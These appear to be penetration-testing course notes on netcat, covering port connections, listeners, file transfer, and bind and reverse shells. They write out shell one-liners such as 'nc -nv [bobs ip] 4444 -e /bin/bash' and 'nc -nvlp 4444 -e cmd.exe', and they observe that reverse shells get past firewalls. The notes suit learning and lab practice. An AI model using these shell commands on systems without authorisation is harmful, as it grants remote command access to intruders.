***
Hackers swiss army knife: reads and writes data across network connections using TCP or UDP protocols.
***
## Connecting to a TCP/UDP Port
Netcat can run in client or server mode.
Client mode can:
- Check if a port is open
- Read a banner from a service listening on a port
- Connect to a network service manually

`nc -nv 10.11.0.22 110` Connect to a TCP POP3 server
**-n** Skip dns name resolution
**-v** add verbosity to output

After connection, we can run standard POP3 commands such as:
`USER offsec`
`PASS offsec`
`quit`

## Listening on a TCP/UDP Port

Win>
`nc -nlvp 4444` Set up a listener (server) with:
**-n** Skip dns name resolution
**-l** Designate listener
**-v** add verbosity to output
**-p** Specify port

Kali>
`nc -nv [listener ip] 4444` Connect to the listener (via a client)

## Transferring Files with Netcat

Win> 
`nc -nvlp 4444 > incoming.exe` Setup nc to receive a file, outputting to incoming.exe

Kali>
`locate wget.exe` Find a file to send
`nc -nv [listener ip] 4444 < /file_path/wget.exe`
nc will transfer the file to the listner

win>
`incoming.exe -h` Attempt to run the file. **-h** for help

## Remote Administration with Netcat
The traditional version of netcat allows for the **-e** flag to be set, allowing program execution after connection completion. Most modern systems DO NOT have this enabled, but Kali does. 

This flag allows the redirection of input, output and error messages of an exe to a TCP/UDP port rather than the default console. 

An example would be **cmd.exe**. Redirecting _stdin, stdout or stderr_, we can bind **cmd.exe** to a local port, allowing a cmd prompt to anyone connection.

### NC Bind shell Scenario
Bob- Windows, Public IP
Alice- Linux, behind NATed connection (internal IP)
Bob wants alice to connect to his machine and run commands.

bob>
`nc -nvlp 4444 -e cmd.exe` Setting up a bind shell

alice>
`nc -nv [bob's ip] 4444` Alice connects and is provided a cmd prompyt
`ipconfig` Alice test the connection
![0c6c0867bd8a6bde7016eac0337c3bc8.png](../../../../_resources/0c6c0867bd8a6bde7016eac0337c3bc8.png)

### Reverse Shell Scenario
In this scenario, Alice has no control over the router in her office and cannot forward traffic from the router to her internal machine.

Instead, we will use nc to _send_ a cmd shell to a host that's listening on a specific port.

bob>
`nc -nlvp 4444` Set up listener to receive a reverse shell

alice>
`nc -nv [bobs ip] 4444  -e /bin/bash` send a rev. shell

bob> 
`ip address show eth0 | grep inet` Once established, Alice's nc will have redirected **/bin/bash** input, output an error data streams to Bob's machine on port 4444. Bob can interact.
![cd78600faa2a64130e113fe9bcbf7fa8.png](../../../../_resources/cd78600faa2a64130e113fe9bcbf7fa8.png)

***
It's not uncommon for host-based firewalls to block access to bind shells. Reverse shells are typically easier to troubleshoot!
****

